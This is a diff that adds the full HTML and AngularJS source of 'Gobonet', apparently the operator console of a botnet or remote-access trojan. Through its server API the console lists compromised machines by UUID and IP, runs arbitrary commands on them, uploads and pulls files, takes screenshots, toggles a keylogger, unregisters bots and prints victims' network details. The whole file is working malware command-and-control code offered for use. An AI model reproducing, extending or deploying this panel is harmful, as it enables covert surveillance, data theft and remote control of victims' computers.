@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="stylesheet" href="bower_components/angular-material/angular-material.css">
+</head>
+
+<body>
+    <div ng-app="gobonet" ng-controller="listAttackMachine" layout="column" layout-fill>
+        <div flex class="md-whiteframe-z1" layout-margin layout="column">
+            <md-content style="min-height:330px">
+                <md-toolbar>
+                    <div class="md-toolbar-tools">
+                        <h3><span>Gobonet Main</span></h3>
+                        <div flex></div>
+                        <md-button class="md-raised" aria-label="Exit" ng-click="Exit()">
+                            Exit
+                        </md-button>
+                    </div>
+                </md-toolbar>
+                <div layout="row">
+                    <md-content flex style="border:1px solid gray">
+                        <md-list flex style="height:260px">
+                            <md-list-item class="md-3-line" ng-repeat="item in listMachine" ng-if="item.isShown === 1" aria-label="itemListMachine" ng-click="ClickItemUser(item)">
+                                    <div ng-if="item.uuid === chooseItem.uuid">
+                                        <img ng-src="./pic/at.jpg" class="md-avatar" />
+                                    </div>
+                                    <div ng-if="item.uuid !== chooseItem.uuid">
+                                        <img ng-src="./pic/lol.jpg" class="md-avatar" />
+                                    </div>
+                                    <div class="md-list-item-text" layout="column">
+                                        <div class="md-list-item-text" layout="row" layout-fill>
+                                            <h3><span><b>UUID</b>:{{ item.uuid }}</span></h3>
+                                        </div>
+                                        <div class="md-list-item-text" layout="row" layout-fill>
+                                            <h3><span><b>GroupID</b>:{{ item.groupid }}</span></h3>
+                                        </div>
+                                        <div class="md-list-item-text" layout="row" layout-fill>
+                                            <h3><span><b>Name</b>:{{ item.name }}</span></h3>
+                                        </div>
+                                        <div class="md-list-item-text" layout="row" layout-fill>
+                                            <h3><span><b>IP</b>:{{ item.ip }}</span></h3>
+                                        </div>
+                                        <div class="md-list-item-text" layout="row" layout-fill>
+                                            <h3><span><b>Last idle</b>:{{ item.time | date:'d MMM yyyy HH:mm:ss' }}</span></h3>
+                                        </div>
+                                        <md-divider ng-if="!$last"></md-divider>
+                                    </div>
+                            </md-list-item>
+                        </md-list>
+                    </md-content>
+                    <md-content flex="30" ng-hide="!debug" class="ng-hide" style="border:1px solid gray">
+                        <textarea ng-model="message" style="height:300px;width:100%"></textarea>
+                    </md-content>
+                </div>
+            </md-content>
+            <md-content style="border:1px solid gray">
+                <div layout="column">
+                    <md-tabs md-dynamic-height md-dynamic-width md-border-bottom md-selected="selectedIndex">
+                        <md-tab label="information" md-on-select="setActiveTab(0)">
+                            <md-content class="md-padding">
+                                <span><p><b>UUID:</b>{{ chooseItem.uuid }}</p></span>
+                                  <span><p><b>GroupID:</b>{{ chooseItem.groupid }}</p></span>
+                                <span><p><b>IP:</b>{{ chooseItem.ip }}</p></span>
+                                <span><p><b>Last idle:</b>{{ chooseItem.time }}</p></span>
+                                <span><b>INFO:</b><pre>{{ chooseItem.information }}</pre></span>
+                                <br>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="command " md-on-select="setActiveTab(1) ">
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-warn>
+                                    <h2><span>Exec command in cmd:</span></h2>
+                                    <md-button class="md-raised " aria-label="UPDATE " ng-click="SetCommand() ">
+                                        EXEC
+                                    </md-button>
+                                </div>
+                            </md-toolbar>
+                            <md-input-container class="md-icon-float md-block ">
+                                <label>Command</label>
+                                <input ng-model="command_param " type="text ">
+                            </md-input-container>
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-warn>
+                                    <h2><span>List last exec command</span></h2>
+                                    <md-button class="md-raised " aria-label="UPDATE " ng-click="GetCommand() ">
+                                        UPDATE
+                                    </md-button>
+                                    <h6>last update {{timeLastUpdateCommand | date:'HH:mm:ss'}}</h6>
+                                </div>
+                            </md-toolbar>
+                            <md-content>
+                                <md-list>
+                                    <md-list-item ng-repeat="item in listCommand ">
+                                        <md-content>
+                                            <pre>{{ item.command }}</pre>
+                                            <pre>{{ item.output }}</pre>
+                                        </md-content>
+                                        <md-divider ng-if="!$last "></md-divider>
+                                    </md-list-item>
+                                </md-list>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="file " md-on-select="setActiveTab(2) ">
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-medium-tall>
+                                    <h2><span>Upload file to machine</span></h2>
+                                    <md-button class="md-raised " aria-label="UPLOAD " ng-click="SendUploadFile() ">
+                                        UPLOAD
+                                    </md-button>
+                                </div>
+                            </md-toolbar>
+                            <md-content>
+                                <div layout="row" layout-fill>
+                                    <span><p>File name:</b>{{ fileNameSelectedFile }}</p></span> &nbsp;&nbsp;&nbsp;
+                                    <span><p>Size:</b>{{ sizeSelectedFile/1024|number:3 }} KB</p></span>
+                                </div>
+                                <input type='file' onchange='angular.element(this).scope().readDataSelectedFile(event)'>
+                                <br/>
+                                <br/>
+                                <span>Read file progress:</span>
+                                <br/>
+                                <md-progress-linear md-mode="determinate " value="{{progressFileUpload}} "></md-progress-linear>
+                                <br/>
+                            </md-content>
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-warn>
+                                    <h2><span>Download file to machine</span></h2>
+                                    <md-button class="md-raised " aria-label="download " ng-click="SendDownloadFile() ">
+                                        DOWNLOAD
+                                    </md-button>
+                                </div>
+                            </md-toolbar>
+                            <md-content>
+                                <md-input-container class="md-icon-float md-block ">
+                                    <label>Path file</label>
+                                    <input ng-model="pathDownloadFile " type="text ">
+                                </md-input-container>
+                            </md-content>
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-warn>
+                                    <h2><span>List files downloaded from machine</span></h2>
+                                    <md-button class="md-raised " aria-label="UPDATE " ng-click="LoadFiles() ">
+                                        UPDATE
+                                    </md-button>
+                                    <h6>last update {{timeLastUpdateFiles | date:'HH:mm:ss'}}</h6>
+                                </div>
+                            </md-toolbar>
+                            <md-content>
+                                <md-list>
+                                    <md-list-item ng-repeat="item in listFiles ">
+                                        <md-content>
+                                            <a ng-href='http://{{server_host_files}}/{{item.data}}'>{{item.filename}}</a>
+                                        </md-content>
+                                        <md-divider ng-if="!$last "></md-divider>
+                                    </md-list-item>
+                                </md-list>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="screenshot " md-on-select="setActiveTab(3) ">
+                            <md-toolbar>
+                                <div class="md-toolbar-tools " md-warn>
+                                    <h2><span>List screenshot</span></h2>
+                                    <md-button class="md-raised " aria-label="Screenshot " ng-click="MakeScreenshot() ">
+                                        Screenshot
+                                    </md-button>
+                                    <md-button class="md-raised " aria-label="UPDATE " ng-click="LoadScreenshot() ">
+                                        UPDATE
+                                    </md-button>
+                                    <h6>last update {{timeLastUpdateScreenshots | date:'HH:mm:ss'}}</h6>
+                                </div>
+                            </md-toolbar>
+                            <md-content>
+                                <div layout="row" layout-fill layout-wrap layout-margin>
+                                    <div ng-repeat="item in listScreenshots">
+                                        <a ng-click='OpenImage(item.data)'><img ng-src='http://{{server_host_files}}/{{item.data}}' height="200" width="300" style="padding:5px; border-radius: 6px; background:#FAEBD7" /></a>
+                                    </div>
+                                </div>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="Destroy" md-on-select="setActiveTab(4) ">
+                            <md-content layout-padding>
+                                <md-button class="md-raised " aria-label="Unregistration" ng-click="DestroyBot()">
+                                    Unregistration bot
+                                </md-button>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="KeyLogger" md-on-select="setActiveTab(5) ">
+                            <md-content layout-padding>
+                                <div ng-if="!statusLogger">
+                                    <md-button class="md-raised" aria-label="StartLogger" ng-click="StartKeyLogger()">
+                                        StartLogger
+                                    </md-button>
+                                </div>
+                                <div ng-if="statusLogger">
+                                    <md-button class="md-raised" aria-label="StopLogger" ng-click="StopKeyLogger()">
+                                        StopLogger
+                                    </md-button>
+                                </div>
+                            </md-content>
+                        </md-tab>
+                        <md-tab label="Setting " md-on-select="setActiveTab(6) ">
+                            <md-content class="md-padding ">
+                                <p>Server:{{server_host}}</p>
+                                <md-switch ng-model="debug " aria-label="Debug " ng-click="SetDebugMode() ">
+                                    Debug Mode: {{ debug }}
+                                </md-switch>
+                                <p>Type shown machines:
+                                <label><input type="radio" ng-model="typeMachine" value="0">Active</label>
+                                <label><input type="radio" ng-model="typeMachine" value="1">Not active</label>
+                                <label><input type="radio" ng-model="typeMachine" value="2">All</label>
+                                <br/>
+                                <label for="exampleInput">Time aging machines:</label>
+                                <input type="number" name="input" ng-model="timeAgingMachine" required> second
+                                <br/>
+                                <md-button class="md-raised" aria-label="UpdateTime" ng-click="SetTimeAgingMachine()">
+                                        Update
+                                </md-button>
+                                <br/><hr>
+                                <md-button class="md-raised" aria-label="PrintInformation" ng-click="OpenPrintInformationDialog()">
+                                        Print information about machines
+                                </md-button>
+                            </md-content>
+                        </md-tab>
+                    </md-tabs>
+                </div>
+            </md-content>
+        </div>
+    </div>
+    <script src="bower_components/angular/angular.js "></script>
+    <script src="bower_components/angular-animate/angular-animate.min.js "></script>
+    <script src="bower_components/angular-aria/angular-aria.min.js "></script>
+    <script src="bower_components/angular-messages/angular-messages.min.js "></script>
+    <script src="bower_components/angular-material/angular-material.min.js "></script>
+    <script src="bower_components/jquery/dist/jquery.min.js "></script>
+    <script src="bower_components/ngstorage/ngStorage.min.js "></script>
+    <script src="bower_components/angular-clipboard/angular-clipboard.js"></script>
+    <script src="bower_components/angular-base64/angular-base64.js "></script>
+    <script>
+    var app = angular.module('gobonet', ['ngMaterial', 'base64', 'ngMessages', 'ngStorage', 'angular-clipboard'])
+    app.controller('listAttackMachine', ['$scope', '$http', '$window', '$base64', '$filter', '$mdToast', '$interval', '$mdDialog', '$sce', '$document', 'clipboard', function($scope, $http, $window, $base64, $filter, $mdToast, $interval, $mdDialog, $sce, $document, clipboard) {
+        var loc = $window.location.href;
+        $scope.timeAgingMachine = 360
+        $scope.pathhost = loc.substring(0, loc.lastIndexOf('/'));
+
+        $scope.GetlistAttackMachine = function() {
+            $scope.timeLastUpdateListMachine = new Date();
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            $http.get('http://' + $scope.server_host + '/api/v1/admin/get_active_users', config)
+                .success(function(data, status, headers, config) {
+                    $scope.listMachine = data;
+                    $scope.DebugMessage($scope.GetDate() + " - Update list machine success. ");
+                    var currentTime = new Date()
+                    $scope.listMachine.forEach(function(item) {
+                        var itemTime = new Date(item.time)
+                        var differenceTime = currentTime - itemTime
+                        switch ($scope.typeMachine) {
+                            case "0":
+                            if (differenceTime < $scope.timeAgingMachine*1000) {
+                                item.isShown = 1
+                            } else {
+                                item.isShown = 0
+                            }
+                            break
+                            case "1":
+                            if (differenceTime < $scope.timeAgingMachine*1000) {
+                                item.isShown = 0
+                            } else {
+                                item.isShown = 1
+                            }
+                            break
+                            case "2":
+                            item.isShown = 1
+                            break
+                        }
+                    });
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Update list machine error( " + data + ". ");
+                });
+        };
+
+        $scope.LoadScreenshot = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            $scope.timeLastUpdateScreenshots = new Date()
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*',
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/get_screenshots/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.get(completeUrl, config)
+                .success(function(data, status, headers, config) {
+                    $scope.listScreenshots = data;
+                    $scope.DebugMessage($scope.GetDate() + " - Update list screenshot success for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command load screenshot - success')
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Update list screenshot error( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command load screenshot - error')
+                });
+        }
+
+        $scope.GetCommand = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+
+            $scope.timeLastUpdateCommand = new Date();
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/get_output_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.get(completeUrl, config)
+                .success(function(data, status, headers, config) {
+                    $scope.listCommand = data;
+                    $scope.DebugMessage($scope.GetDate() + " - Update list command success for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command get command - success')
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Update list command error( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command get command - error')
+                });
+        }
+
+        $scope.MakeScreenshot = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var data = $.param({
+                command: 'screenshot',
+                command_param: ''
+            });
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Screnshot( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command screenshot - success')
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Screnshot( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command screenshot - error')
+                });
+        }
+
+        $scope.SetCommand = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+            var data = $.param({
+                command: 'exec',
+                command_param: $base64.encode($window.encodeURIComponent($scope.command_param))
+            });
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Command( " + $scope.command + ": " + $scope.command_param + ") - ( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command ' + $scope.command_param + ' - success')
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Command( " + $scope.command + ": " + $scope.command_param + ") - ( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command ' + $scope.command_param + ' - error')
+                });
+        }
+
+        $scope.LoadFiles = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+
+            $scope.timeLastUpdateFiles = new Date();
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*',
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/get_files/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.get(completeUrl, config)
+                .success(function(responseData, status, headers, config) {
+                    $scope.listFiles = responseData
+                    $scope.DebugMessage($scope.GetDate() + " - Get Files( " + status + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command load files - success')
+                })
+                .error(function(data, status, header, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - Get Files( " + responseData + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command load files - error')
+                });
+        }
+
+        $scope.SendUploadFile = function() {
+            if ($scope.binaryDataUploadFile == undefined || $scope.chooseItem == undefined) {
+                return
+            }
+            var data = $.param({
+                data: $base64.encode($scope.binaryDataUploadFile),
+                filename: $base64.encode($window.encodeURIComponent($scope.fileNameSelectedFile))
+            });
+
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_file/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - UploadFile( " + status + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command upload file - success')
+                })
+                .error(function(data, status, headers, config) {
+                    $scope.DebugMessage($scope.GetDate() + " - UploadFile( " + data + ") for uuid=" + $scope.chooseItem.uuid);
+                    $scope.showSimpleToast('Send command upload file - error')
+                });
+        }
+
+        $scope.SendDownloadFile = function() {
+            if ($scope.pathDownloadFile == undefined || $scope.chooseItem == undefined) {
+                return
+            }
+            var data = $.param({
+                command: 'download',
+                command_param: $base64.encode($window.encodeURIComponent($scope.pathDownloadFile))
+            });
+
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command download file - success')
+                })
+                .error(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command download file - error')
+                });
+        }
+
+        $scope.DestroyBot = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            var data = $.param({
+                command: 'destroy',
+                command_param: ''
+            });
+
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command Destroy bot - success');
+
+
+                    var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/deactivate_user/';
+                    var currentUuid = $scope.chooseItem.uuid;
+                    var completeUrl = getUrl.concat(currentUuid);
+
+                    $http.get(completeUrl, config)
+                        .success(function(data, status, headers, config) {
+                             $scope.showSimpleToast('Set status deactivated - success');
+                             })
+                        .error(function(data, status, headers, config) {
+                            $scope.showSimpleToast('Set status deactivated  - error');
+                        });
+
+                })
+                .error(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command Destroy bot - error');
+                });
+        }
+
+        $scope.StartKeyLogger = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            var data = $.param({
+                command: 'keys',
+                command_param: ''
+            });
+
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command StartKeyLogger - success')
+                    $scope.statusLogger = true
+                    $window.sessionStorage.setItem($scope.chooseItem.uuid + "_KeyLogger", $scope.statusLogger)
+                })
+                .error(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command StartKeyLogger - error')
+                });
+        }
+
+        $scope.StopKeyLogger = function() {
+            if ($scope.chooseItem == undefined) {
+                return
+            }
+            var data = $.param({
+                command: 'keysStop',
+                command_param: ''
+            });
+
+            var config = {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;',
+                    'Authorization': $window.sessionStorage.getItem('Token'),
+                    'Access-Control-Allow-Origin': '*'
+                }
+            }
+
+            var getUrl = 'http://' + $scope.server_host + '/api/v1/admin/set_command/';
+            var currentUuid = $scope.chooseItem.uuid;
+            var completeUrl = getUrl.concat(currentUuid);
+            $http.post(completeUrl, data, config)
+                .success(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command StopKeyLogger - success')
+                    $scope.statusLogger = false
+                    $window.sessionStorage.setItem($scope.chooseItem.uuid + "_KeyLogger", $scope.statusLogger)
+                })
+                .error(function(data, status, headers, config) {
+                    $scope.showSimpleToast('Send command StopKeyLogger - error')
+                });
+        }
+
+        $scope.Exit = function() {
+            $http.defaults.headers.common.Authorization = '';
+            $window.sessionStorage.removeItem('Token');
+            $window.location.href = $scope.pathhost + '/auth.html ';
+        }
+
+        $scope.CheckAuth = function() {
+            if ($window.sessionStorage.getItem('Token') == undefined) {
+                $window.location.href = $scope.pathhost + '/auth.html';
+            } else {
+                $scope.hgt = $window.innerHeight - 150;
+                $scope.LogMessage = [];
+                $scope.server_host = $window.sessionStorage.getItem('Server')
+                $scope.server_host_files = $window.sessionStorage.getItem('ServerFiles')
+                $scope.typeChoose = $scope.DefineBooleanVar($window.localStorage.getItem('TypeChoose'))
+                $scope.debug = $scope.DefineBooleanVar($window.localStorage.getItem('DebugMode'))
+                $scope.timeAgingMachine = parseInt($window.localStorage.getItem('TimeAgingMachine'))
+                if ($scope.timeAgingMachine == undefined) {
+                    $scope.timeAgingMachine = 360
+                }
+                $scope.typeMachine = $window.localStorage.getItem('TypeMachine')
+                if ($scope.typeMachine == undefined) {
+                    $scope.typeMachine = "2"
+                }
+                $scope.selectedIndex = $window.localStorage.getItem('ActiveTab')
+                if ($scope.selectedIndex === undefined) {
+                    $scope.selectedIndex = 0
+                }
+                $interval($scope.GetlistAttackMachine, 10000)
+            }
+        }
+
+        $scope.DefineBooleanVar = function(checkVar) {
+            if (angular.isUndefined(checkVar)) {
+                return true
+            } else {
+                if (checkVar == 'true') {
+                    return true
+                } else {
+                    return false
+                }
+            }
+        }
+
+        $scope.ClickItemUser = function(item) {
+            $scope.chooseItem = item;
+            $scope.statusLogger = $scope.DefineBooleanVar($window.sessionStorage.getItem(item.uuid + "_KeyLogger"))
+            $scope.LoadScreenshot();
+            $scope.LoadFiles()
+            $scope.GetCommand();
+            $scope.showSimpleToast(item.uuid)
+        }
+
+        $scope.readDataSelectedFile = function(event) {
+            var input = event.target;
+
+            $scope.$apply(function($scope) {
+                $scope.fileNameSelectedFile = input.files[0].name;
+                $scope.sizeSelectedFile = input.files[0].size;
+            })
+
+            var reader = new FileReader();
+            reader.onload = function() {
+                $scope.binaryDataUploadFile = reader.result;
+                console.log($scope.binaryDataUploadFile.byteLength);
+            }
+            reader.onerror = function(event) {
+                $scope.responseUploadFile = event.target.error;
+            }
+            reader.onprogress = function(event) {
+                $scope.progressFileUpload = (event.loaded / event.total) * 100;
+            }
+            reader.readAsBinaryString(input.files[0]);
+        }
+
+        $scope.showSimpleToast = function(message) {
+            $mdToast.show(
+                $mdToast.simple()
+                .textContent(message)
+                .hideDelay(1000)
+            );
+        }
+
+        $scope.DebugMessage = function(message) {
+            if ($scope.debug == true) {
+                if ($scope.message != undefined) {
+                    $scope.message = $scope.message + '\n' + message;
+                } else {
+                    $scope.message = message;
+                }
+            }
+        }
+
+        $scope.setActiveTab = function(index) {
+            $window.localStorage.setItem('ActiveTab', index);
+        }
+
+        $scope.SetDebugMode = function() {
+            $window.localStorage.setItem('DebugMode', !$scope.debug);
+        }
+
+        $scope.setTypeChoose = function() {
+            $window.localStorage.setItem('TypeChoose', !$scope.typeChoose);
+        }
+
+        $scope.GetDate = function() {
+            var _date = $filter('date')(new Date(), 'HH:mm:ss');
+            return _date;
+        }
+
+        $scope.SetTimeAgingMachine = function() {
+            $window.localStorage.setItem('TimeAgingMachine', $scope.timeAgingMachine)
+            $window.localStorage.setItem('TypeMachine', $scope.typeMachine)
+            $scope.GetlistAttackMachine()
+        }
+
+        $scope.OpenImage = function(imageUrl) {
+            $mdDialog.show({
+              template: '<md-dialog aria-label=\'screenshotImage\'><md-dialog-content><img ng-src={{screen}} /></md-dialog-content></md-dialog>',
+              locals: { screenshotUrl: 'http://' + $scope.server_host_files +'/' + imageUrl },
+              clickOutsideToClose:true,
+              controller: function DialogController($scope, $mdDialog, screenshotUrl) {
+                $scope.screen = screenshotUrl
+                $scope.closeDialog = function() {
+                        $mdDialog.hide();
+                }
+            }
+            })
+        }
+
+        $scope.OpenPrintInformationDialog = function() {
+            $mdDialog.show({
+              templateUrl: 'printDialog.tmpl.html',
+              locals: { listMachine: $scope.listMachine },
+              clickOutsideToClose:true,
+              controller: function PrintDialog($scope, $mdDialog, listMachine) {
+                $scope.listMachine = listMachine
+                $scope.print_name = true
+                $scope.print_ip = true
+
+                $scope.printInformation = function() {
+                    var print_result = ""
+                    $scope.listMachine.forEach(function(item) {
+                        print_result += "<table border=\"1\" style=\"border:1px solid gray;width:100%\">"
+                        if ($scope.print_name === true) {
+                            print_result += "<tr><th>Name:</th><td>"
+                            print_result += item.name
+                            print_result += "</td></tr>"
+                        }
+                        if ($scope.print_ip === true) {
+                            print_result += "<tr><th>IP:</th><td>"
+                            print_result += item.ip
+                            print_result += "</td></tr>"
+                        }
+                        if ($scope.print_information === true) {
+                            print_result += "<tr><th colspan=\"2\">IPCONFIG:</th></tr><tr><td colspan=\"2\"><pre>"
+                            print_result += item.information
+                            print_result += "</td></pre></tr>"
+                        }
+                        print_result += "</table><br/>"
+                    });
+                    $scope.print_result = $sce.trustAsHtml(print_result)
+                }
+
+                $scope.copyReport = function() {
+                    var copyElement = document.getElementById('report')
+                    var body = document.body, range, sel;
+                    if (document.createRange && window.getSelection) {
+                        range = document.createRange();
+                        sel = window.getSelection();
+                        sel.removeAllRanges();
+                        try {
+                            range.selectNodeContents(copyElement);
+                            sel.addRange(range);
+                        } catch (e) {
+                            range.selectNode(copyElement);
+                            sel.addRange(range);
+                        }
+                    } else if (body.createTextRange) {
+                        range = body.createTextRange();
+                        range.moveToElementText(copyElement);
+                        range.select();
+                    }
+                }
+
+                $scope.closeDialog = function() {
+                        $mdDialog.hide();
+                }
+            }
+            })
+        }
+
+        $scope.CheckAuth()
+        $scope.GetlistAttackMachine()
+
+    }])
+    </script>
+</body>
+
+</html>
